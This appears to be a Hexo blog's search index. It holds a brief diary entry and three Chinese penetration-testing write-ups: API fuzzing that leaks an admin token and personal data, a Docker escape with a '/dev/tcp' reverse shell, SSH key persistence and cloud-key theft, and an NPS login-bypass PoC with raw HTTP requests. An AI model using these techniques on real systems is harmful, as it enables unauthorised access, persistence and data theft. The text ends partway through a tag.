<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>采薇</title>
      <link href="/posts/f7b3ee/"/>
      <url>/posts/f7b3ee/</url>
      
        <content type="html"><![CDATA[<p>​       难以想象会有这样的一天，从晨曦到黄昏，每一次呼吸、每一个念头都与你紧密相连。每当看到与你相似的身影，心便会悄然跳动，仿佛你就在身边。</p><p>​       我想将我所有的温柔与深情，都寄托在每一个与你有关的瞬间……</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2024.6.11</span><br><span class="line">2024.6.25</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 采薇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防演练之接口敏感信息泄露</title>
      <link href="/posts/undefined/"/>
      <url>/posts/undefined/</url>
      
        <content type="html"><![CDATA[<p><strong>思路：信息收集-真实IP-前后端分离-接口FUZZ-接口敏感信息泄露</strong></p><p>工具：Burp&#x2F;Yakit+FOFA + reverse-sourcemap+FindSomething</p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>某次攻防演练，给定目标域名资产：xxxtest.xxx.com，要求拿分。先着手进行信息收集，访问该url，页面跳转到登录界面，大概长这个样子：</p><p><img src="https://secquan.zzyuncheng.com/53b7b3c9eb19c78a985f610b01558d26.png-quanzi" alt="file"></p><p>登录界面</p><p>Wappalyzer显示前端VUE框架：</p><p><img src="https://secquan.zzyuncheng.com/e453978ce05f87fb8373bf309c150eba.png-quanzi" alt="file"></p><p>FindSomething发现不少VUE文件及接口信息：</p><p><img src="https://secquan.zzyuncheng.com/f9bd2ba73da5424a7e8dfd080125b179.png-quanzi" alt="file"></p><p>查IP发现存在CDN：</p><p><img src="https://secquan.zzyuncheng.com/f2c9ed9d6ee7068f90773fa96db5c04d.png-quanzi" alt="file"></p><p>查JS文件发现webpack打包：（webpack打包之后的访问js文件很慢，应该是没有做优化加上JS太多的缘故）</p><p><img src="https://secquan.zzyuncheng.com/f9bf9688eedc1a8732df2622b781b21c.png-quanzi" alt="file"></p><p>信息收集结果如下：</p><p>前后端分离：前端为webpack打包的VUE、后端Springboot</p><p>IP：存在CDN—需绕过CDN查找真实IP</p><p>icon：icon_hash&#x3D;xxxxxx</p><h2 id="2-真实IP"><a href="#2-真实IP" class="headerlink" title="2.真实IP"></a>2.真实IP</h2><p>由于目标站点存在CDN以及某waf，需查找真实IP才可进行漏洞挖掘，查找真实IP的方法很多，这里不再赘述，根据信息收集到的icon的hash值尝试绕过CDN查找真实IP。</p><p>将目标域名丢进FOFA，查看搜索结果，出现目标icon</p><p><img src="https://secquan.zzyuncheng.com/e72b3070f83b2d73b48660abecf13108.png-quanzi" alt="file"></p><p>FOFA-icon</p><p>直接点击icon即可搜索对应的目标站点：</p><p><img src="https://secquan.zzyuncheng.com/6b4328040d904f8e555c9791738b21d0.png-quanzi" alt="file"></p><p>真实IP</p><p>CDN也在搜索结果中：</p><p><img src="https://secquan.zzyuncheng.com/617057a55c0031a673de0a8453e450b5.png-quanzi" alt="file"></p><p>CDN</p><h2 id="3-前后端分离"><a href="#3-前后端分离" class="headerlink" title="3.前后端分离"></a>3.前后端分离</h2><p>用这种方式查找出来的IP有待验证，需进一步信息收集确定是测试环境还是真实环境。</p><p>找到了真实IP之后，将真实IP继续丢进FOFA，目的就是看系统开放了哪些服务以及端口开放情况（FOFA搜索不全，探测更多信息需另用工具）。</p><p><img src="https://secquan.zzyuncheng.com/f75fe4d3e8ad5595a0d343915f8c8eb1.png-quanzi" alt="file"></p><p>搜索结果</p><p>访问该域名，发现一模一样的系统，着手进行漏洞挖掘</p><p>F12打开浏览器检查出现了接口信息，并且接口地址为api.xxx.com，猜测为前后端分离的系统。</p><p><img src="https://secquan.zzyuncheng.com/24df6c4bb43b1ce805b2fd8b2cf9f8e0.png-quanzi" alt="file"></p><p>针对前后端分离的系统，尤其是接口特别多的时候，可以着重针对于接口未授权进行深入挖掘，有的开发安全意识不足，可能有些接口就未做鉴权，往往未作鉴权的接口就可作为突破点……</p><p>言归正传，前后端分离的系统，专门查接口以及接口参数就对了，先用FindSomething的结果将接口参数提取出来。</p><p><img src="https://secquan.zzyuncheng.com/3af80393dab2d0cec423501cf7c4ac1a.png-quanzi" alt="file"></p><p>接口示例</p><p>接口参数可直接用FindSomething提取出来，剩下的就是找接口了。之前获取接口信息找到了一个接口地址：xxx-xxx-service</p><p>直接查找JS文件，找关键API，关键API找出来之后，拼接参数即可尝试获取敏感信息。（VUE框架，重点找xxx.app.js即可）</p><p>前期根据信息收集得到的webpack打包的JS，直接搜索api、secret、username、token、service等关键字，发现xxx-xxx-service接口，该接口在一个键值对中，示例：</p><p>{</p><p>url: ‘xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx’,</p><p>}</p><p><img src="https://secquan.zzyuncheng.com/4287313d9c81637a976da969001bedfb.png-quanzi" alt="file"></p><p>接口-01</p><p>继续查找接口，发现众多接口均存在一个JS对象的键值对中，键是url，值就是接口地址：</p><p><img src="https://secquan.zzyuncheng.com/4a7755b4c1098d7d11e7dbe5cf9e3d09.png-quanzi" alt="file"></p><p>接口-02</p><p>全局搜索url，将JS文件中的url键值对全部提取出来，写正则匹配脚本也可以全部提取出来。共提取出一百多个接口。</p><p>这里简单介绍一下接口规范，所有的接口都会按照这个规范进行涉及，统称restful架构的接口规范，举个例子：</p><p><a href="http://api.xxx.com/api/system/userLists">http://api.xxx.com/api/system/userLists</a></p><p>接口api、system表示服务名称、userLists表示资源名称，看接口意思大概就能猜到获取用户列表接口，如果是GET型，后边肯定会加参数，比如：</p><p><a href="http://api.xxx.com/api/system/userLists?pageSzie=10&pageNum=1%EF%BC%8C%E6%84%8F%E6%80%9D%E5%BE%88%E6%98%8E%E7%A1%AE%EF%BC%8C%E5%B0%B1%E6%98%AF%E8%B0%83%E7%94%A8%E4%BA%86%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E6%8F%90%E5%8F%96%E5%87%BA%E6%9D%A5%E7%AC%AC%E4%B8%80%E9%A1%B5%E7%9A%84%E5%8D%81%E6%9D%A1%E6%95%B0%E6%8D%AE">http://api.xxx.com/api/system/userLists?pageSzie=10&pageNum=1，意思很明确，就是调用了用户列表的接口，提取出来第一页的十条数据</a>。</p><p>如果是POST型，POST请求包中添加json格式的数据：</p><p>POST &#x2F;api&#x2F;system&#x2F;userLists HTTP&#x2F;1.1<br>Host: api.xxx.com<br>Content-Type: application&#x2F;json<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36</p><p>Content-Length: 0 {“pageSize”10,”pageNum”:1}</p><p>此次目标中，接口很多，拿其中一个接口举例子，接口地址为: <a href="http://api.xxx.com/xxx-xxx-service/xxx/xxx/get%EF%BC%8C%E7%9C%8B%E6%8E%A5%E5%8F%A3%E5%91%BD%E5%90%8D%E7%8C%9C%E6%B5%8B%E4%B8%BA%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%EF%BC%8C%E9%99%A4%E6%AD%A4%E4%B9%8B%E5%A4%96%E8%BF%98%E6%9C%89xxx-xxx-auth%E9%89%B4%E6%9D%83%E6%8E%A5%E5%8F%A3%E3%80%81xxx-xxx-token%E8%8E%B7%E5%8F%96token%E4%BF%A1%E6%81%AF%E6%8E%A5%E5%8F%A3">http://api.xxx.com/xxx-xxx-service/xxx/xxx/get，看接口命名猜测为服务接口，除此之外还有xxx-xxx-auth鉴权接口、xxx-xxx-token获取token信息接口</a>……</p><h2 id="4-接口FUZZ"><a href="#4-接口FUZZ" class="headerlink" title="4.接口FUZZ"></a>4.接口FUZZ</h2><p>一百多个接口地址提取出来之后，尝试拼接在API接口访问路径下进行fuzz，API接口访问路径为：api.xxx.com，使用Burp进行fuzz，记得取消url编码。</p><p><img src="https://secquan.zzyuncheng.com/001be87d97e5600e92d9f4d06652535c.png-quanzi" alt="file"></p><p>Burp跑的结果均为401，接口也都做了鉴权，访问接口应该携带token进行鉴权才能获取到接口内容。</p><p><img src="https://secquan.zzyuncheng.com/07560b28bb4158968f8b87ad36b8f3a1.png-quanzi" alt="file"></p><p>将FindSometing提取出来的参数拼接到api路径后边，同样也是401。</p><p>继续查找JS文件，在JS文件中最后一行发现了xxx.js.map……随即想到了用工具还原webpack打包的JS文件。</p><p><img src="https://secquan.zzyuncheng.com/e14580f0ea521b1d63a39bbd69385e7b.png-quanzi" alt="file"></p><p>直接在JS路径下拼接js.map文件下载下来，文件很大</p><p><img src="https://secquan.zzyuncheng.com/73e9971fb19cac131cff92398c9c82ad.png-quanzi" alt="file"></p><p>使用reverse-sourcemap将该文件还原，会在src目录下（可自定义目录）生成还原后的JS文件，有api目录、config目录、路由目录、css的样式目录……</p><p>工具还原命令：reverse-sourcemap –output-dir src xxx.js.map</p><p><img src="https://secquan.zzyuncheng.com/49f8172e9129f9d5e84f2c10cf0208d1.png-quanzi" alt="file"></p><p><img src="https://secquan.zzyuncheng.com/f525906a88cc5bb2c97adf8aa07bafda.png-quanzi" alt="file"></p><p>生成的目录以及JS文件太多了，直接找关键的api目录、config目录、utils目录等</p><p>直接进入api文件夹中，查找接口JS文件，发现众多接口：</p><p><img src="https://secquan.zzyuncheng.com/1a13b81d75b57749a0df264b407ee607.png-quanzi" alt="file"></p><h2 id="5-敏感信息泄露"><a href="#5-敏感信息泄露" class="headerlink" title="5. 敏感信息泄露"></a>5. 敏感信息泄露</h2><p>继续利用获取到的众多接口文件以及接口信息不断fuzz，根据JS的文件名查找关键接口均无收获。响应基本都为401，很正常，因为需要携带正确合法的token才行。继续尝试fuzz</p><p>终于，在users.js文件中发现了这样一条接口：api&#x2F; token&#x2F;auth?username&#x3D;，根据提示发现该接口是获取token的接口，将接口进行拼接，尝试访问，提示需要传入用户名参数，尝试admin用户进行接口访问：api&#x2F; token&#x2F;auth?username&#x3D;admin，成功获取到token值。</p><p><img src="https://secquan.zzyuncheng.com/aef7eef54463d444493f400bd9a0881c.png-quanzi" alt="file"></p><p>管理员的token值获取到了，可以对平台所有接口进行操作利用，任意增删改查，需要注意的是接口fuzz的过程中需要添加或修改参数，根据还原出来的JS文件中的接口参数进行利用，尝试获取敏感信息。</p><p>此次还原出来的API文件夹下JS文件有700个左右，如何快速在700个文件中快速查找关键信息接口？</p><p>第一：在JS文件中，会有接口参数提示以及接口功能提示：</p><p><img src="https://secquan.zzyuncheng.com/85ec334ab38e11aa5b0ae02b19cd117f.png-quanzi" alt="file"></p><p>第二：还原出来的JS文件的命名也可以帮助我们快速找到关键接口信息：</p><p><img src="https://secquan.zzyuncheng.com/f26e63a221ae0dc0efa29457f117f191.png-quanzi" alt="file"></p><p>接口获取百万+个人敏感信息：</p><p><img src="https://secquan.zzyuncheng.com/ad0e3a26e6bb2d92d6ce3c2e22e06f50.png-quanzi" alt="file"></p><p>PageNum和pageSize参数均为JS文件中提示的接口参数，也可以fuzz出来，除此之外，还有众多参数。</p><p>在另外一个JS文件中获取到了个人购买信息接口，直接构造参数获取挺多的个人敏感信息：</p><p><img src="https://secquan.zzyuncheng.com/ef4d08a72de2402ddfba41ebe77baf31.png-quanzi" alt="file"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻防演练 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的Docker逃逸+反编译jar接管云主机</title>
      <link href="/posts/79f4808/"/>
      <url>/posts/79f4808/</url>
      
        <content type="html"><![CDATA[<h2 id="一-思路"><a href="#一-思路" class="headerlink" title="一. 思路"></a>一. 思路</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Portainer弱口令-Docker逃逸-写入SSH公钥  shiro反序列化-注入内存马-反编译jar-接管云主机</span><br></pre></td></tr></table></figure><h2 id="二-简单的Docker逃逸"><a href="#二-简单的Docker逃逸" class="headerlink" title="二.简单的Docker逃逸"></a>二.简单的Docker逃逸</h2><h3 id="1-Protainer弱口令"><a href="#1-Protainer弱口令" class="headerlink" title="1.Protainer弱口令"></a>1.Protainer弱口令</h3><p>Portainer常见的操作docker的图形化工具，轻量又好用，但是有不少Portainer存在弱口令，诸如：portainer&#x2F;portainer；admin&#x2F;12345678；portainer&#x2F;12345678等等，注意密码长度差不多都是8位……</p><h3 id="2-特权模式逃逸"><a href="#2-特权模式逃逸" class="headerlink" title="2.特权模式逃逸"></a>2.特权模式逃逸</h3><p>弱口令进入portainer之后，尝试挂载根目录进行逃逸失败，随即尝试特权模式进行Docker逃逸</p><p>添加容器：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/tianjia.png" alt="image.png"></p><p>以特权模式运行容器：<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/tequanmoshi.png" alt="image.png"><br>随后部署容器即可：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/bushurongqi.png" alt="img"></p><p>随后查看容器列表、确保容器正常运行：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/running.png" alt="img"></p><p>以root进入容器：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/intorongqi.png" alt="img"></p><p>正常情况下，很多命令不能使用：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/cantifconfig.png" alt="img"></p><p>首先、查看当前磁盘分区情况，获得宿主机分区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l </span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/fdisk-l.png" alt="img"></p><p>获取宿主机磁盘为&#x2F;dev&#x2F;vda1</p><p>挂载宿主机磁盘:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> li1u  ----创建文件</span><br><span class="line"></span><br><span class="line">mount /dev/vda1 /li1u/  ----挂载至文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">chroot</span> /li1u/  ----在li1u根目录下运行</span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/mkdirli1u.png" alt="img"></p><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><p>尝试反弹shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx/8000 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>成功反弹：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/rev-shell.png" alt="img"></p><h3 id="4-写入SSH公钥"><a href="#4-写入SSH公钥" class="headerlink" title="4.写入SSH公钥"></a>4.写入SSH公钥</h3><p>反弹shell成功之后，尝试写ssh公钥做个小的权限维持：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/lsssh.png" alt="img"></p><p>用xshell生成一个用户密钥：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/shengcmiyao.png" alt="img"></p><p>随后点击属性-公钥，复制公钥内容：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/gongyaocontent.png" alt="img"></p><p>使用echo命令追加公钥到authorized_keys中：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/xieruyonggao.png" alt="img"></p><p>cat authorized_keys追加成功：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/zhuijiacg.png" alt="img"></p><p>尝试使用xshell连接（前期信息收集得知ssh开放端口2021）</p><p>用户身份验证选择publickey（公钥登录），平常都是用户名密码连接：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/gongyaolianjie.png" alt="img"></p><p>点击设置，选择刚刚生成的密钥，填入自己设置的密码进行连接即可：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/lianjiesuccess.png" alt="img"><br>接下来就是内网了……</p><h2 id="三-反编译jar接管云主机"><a href="#三-反编译jar接管云主机" class="headerlink" title="三. 反编译jar接管云主机"></a>三. 反编译jar接管云主机</h2><h3 id="1-shiro反序列化-注内存马"><a href="#1-shiro反序列化-注内存马" class="headerlink" title="1. shiro反序列化-注内存马"></a>1. shiro反序列化-注内存马</h3><p>常规操作，就不多说了，打入冰蝎内存马：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917021346614.png" alt="img"></p><h3 id="2-扩大成果（查找敏感信息）"><a href="#2-扩大成果（查找敏感信息）" class="headerlink" title="2.扩大成果（查找敏感信息）"></a>2.扩大成果（查找敏感信息）</h3><p>连接之后，尝试查找敏感信息：<br>前期信息收集得知目标为SpringBoot框架，spring的配置文件都是yml和properties，linux直接查找指定后缀名的文件，未发现敏感信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.yml .properties</span><br></pre></td></tr></table></figure><h3 id="3-反编译jar获取大量配置信息"><a href="#3-反编译jar获取大量配置信息" class="headerlink" title="3.反编译jar获取大量配置信息"></a>3.反编译jar获取大量配置信息</h3><p>随后翻到网站根目录，发现了不同文件夹下边有三个jar包，应该都打包成jar运行了。</p><p>直接下载jar到本地，对jar包进行反编译：</p><blockquote><p>方法一：修改文件扩展名</p></blockquote><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022334656.png" alt="img"></p><p>修改jar扩展名为zip等，直接解压即可：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022418514.png" alt="img"></p><p>在clsses文件夹下，找到properties配置文件：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022436489.png" alt="img"></p><p>获取ak&#x2F;sk：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022544603.png" alt="img"><br>使用ak&#x2F;sk利用工具或者行云管家导入云主机即可</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917025851808.png" alt="image-20230917025851808"></p><p>其中OSS存储桶中发现大量敏感信息<br>还有vx小程序的appid和secret，直接调用官方API即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=APPID&amp;secret=APPSECRET</span><br></pre></td></tr></table></figure><p>利用官方API还可获取小程序反馈情况、小程序用户访问数据、发送信息等等等等，几近接管小程序</p><blockquote><p>方法二：jd-gui反编译jar</p></blockquote><p>直接拖动jar包到jd-gui中即可：同样的配置信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917023226923.png" alt="img"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/9ef582612c6bce21e1c40f750925ff6.jpg" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPS反制之绕过登陆验证</title>
      <link href="/posts/f17a86d9/"/>
      <url>/posts/f17a86d9/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NPS- 一款轻量级、高性能、功能强大的内网穿透代理服务器</span><br></pre></td></tr></table></figure><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>看了师傅的一个文章，感觉挺有意思的，尝试记录下来，结尾有”惊吓”</p><p>GitHub下载NPS的releases：<a href="https://github.com/ehang-io/nps/releases/tag/v0.26.10">https://github.com/ehang-io/nps/releases/tag/v0.26.10</a></p><p>为了本地测试使用，只下载Windows的server端和NPS的源码到本地。</p><p>内网穿透代理工具诸如frp、nps、 reGeorg等，各有千秋吧，我个人用的nps比较多。</p><h2 id="2-NPS"><a href="#2-NPS" class="headerlink" title="2.NPS"></a>2.NPS</h2><p>解压nps之后，会有一个conf和web文件夹、以及一个nps的可执行程序</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601111848114.png" alt="image-20230601111848114"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf：可配置文件，可修改ip、端口、登陆密码等</span><br><span class="line">web：nps中web管理系统的静态资源文件</span><br></pre></td></tr></table></figure><p>直接进入nps目录，运行nps</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601112209248.png" alt="image-20230601112209248"></p><p>在配置文件conf中，有IP、端口、以及默认用户名口令admin&#x2F;123，(默认用户名口令一定要改)，默认端口8080也建议更改。</p><p>直接访问nps后台，输入admin&#x2F;123登陆后台</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601112400201.png" alt="image-20230601112400201"></p><p>进入后台首页：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601113512283.png" alt="image-20230601113512283"></p><p>客户端模块，配置隧道、在npc端机器运行命令即可”上线”</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601121323565.png" alt="image-20230601121323565"></p><h2 id="3-默认配置-绕过登陆验证"><a href="#3-默认配置-绕过登陆验证" class="headerlink" title="3.默认配置-绕过登陆验证"></a>3.默认配置-绕过登陆验证</h2><p>正常情况下，NPS需要登陆之后才可进行后续操作，但是NPS中有默认配置，假如未修改默认配置的话，我们就可以绕过身份验证访问后台。</p><p>打开NPS的源码文件，在web目录下的controllers目录（和php有些类似）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601122046911.png" alt="image-20230601122046911"></p><p>在base.go文件中，第36行代码处</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601122804139.png" alt="image-20230601122804139"></p><p>条件判断的大概意思就是如果md5key值不为空并且当前时间戳与给定的timestamp之间的差小于等于20，并且通过对configKey和timestamp进行加密得到的结果与md5key相等，结果就是true</p><p>如果auth不为真，那就302跳转到登陆页，如果为真，那就作为模板数据传递。</p><p>整块代码的意思就是从请求中获取auth_key和timestamp、从配置文件中获取auth_key，并赋值给configKey</p><p>但是在nps.conf中，auth_key是注释掉的：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601124216245.png" alt="image-20230601124216245"></p><p>所以我们只需要在请求中添加auth_key与timestamp，即可绕过身份验证（登陆成功跳转index&#x2F;index）</p><p>POC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index/index?auth_key=xxx&amp;timestamp=xxx</span><br></pre></td></tr></table></figure><p>通俗易懂的就是auth_key&#x3D;md5(timestamp)</p><p>编写脚本获取POC：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601133530827.png" alt="image-20230601133530827"></p><p>携带POC直接绕过登陆验证尝试访问后台（只有20S的时间，过期需重新生成）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601133516875.png" alt="image-20230601133516875"></p><h2 id="4-NPS反制"><a href="#4-NPS反制" class="headerlink" title="4.NPS反制"></a>4.NPS反制</h2><p>绕过登陆验证之后，可以在后台进行任意操作</p><p>查看客户端列表：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601151944330.png" alt="image-20230601151944330"></p><p>修改配置：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601152051351.png" alt="image-20230601152051351"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601152141505.png" alt="image-20230601152141505"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601152153541.png" alt="image-20230601152153541"></p><p>来个有意思的的：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601152254423.png" alt="image-20230601152254423"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601152307610.png" alt="image-20230601152307610"></p><p>后台所有的功能都可以携带auth_key和timestamp进行操作</p><p>删除客户端：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601152618658.png" alt="image-20230601152618658"></p><p>删除id为2的客户端：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/client/del?auth_key=b57ab4e636cbaa4dda1a0256ae597080&amp;timestamp=1685604329</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">id</span><span class="operator">=</span><span class="number">2</span></span></span><br></pre></td></tr></table></figure><p>查询客户端列表：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/client/list?auth_key=83a737f7d232957e7a7821ff6091f149&amp;timestamp=1685604434</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="keyword">search</span>=&amp;<span class="keyword">order</span>=<span class="keyword">asc</span>&amp;<span class="keyword">offset</span>=<span class="number">0</span>&amp;<span class="keyword">limit</span>=<span class="number">10</span></span></span><br></pre></td></tr></table></figure><p>本地搭建的，npc端未设置，仅作测试用，师傅们想进行更多的操作，手动抓包测试即可。</p><h2 id="5-分析"><a href="#5-分析" class="headerlink" title="5.分析"></a>5.分析</h2><p>在nps中，路径下加auth&#x2F;getauthkey可获取到加密后的crypt_auth_key</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601153420062.png" alt="image-20230601153420062"></p><p>这个加密后的crypt_auth_key就是默认的授权密钥，也就是加密后的密文，加密方式是AES算法的CBC模式</p><p>在nps.conf中，auth_crypt_key（密钥）是16位的，且默认的auth_crypt_key（密钥）是1234567812345678，所以经过AES加密之后的密文就是crypt_auth_key&#x3D;5acabcf051cd55abca03d18294422e01，所以访问auth&#x2F;getauthkey获取到的crypt_auth_key就是AES加密的密文，密钥就是auth_crypt_key的值（可随意更改、满足16位即可）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601153735016.png" 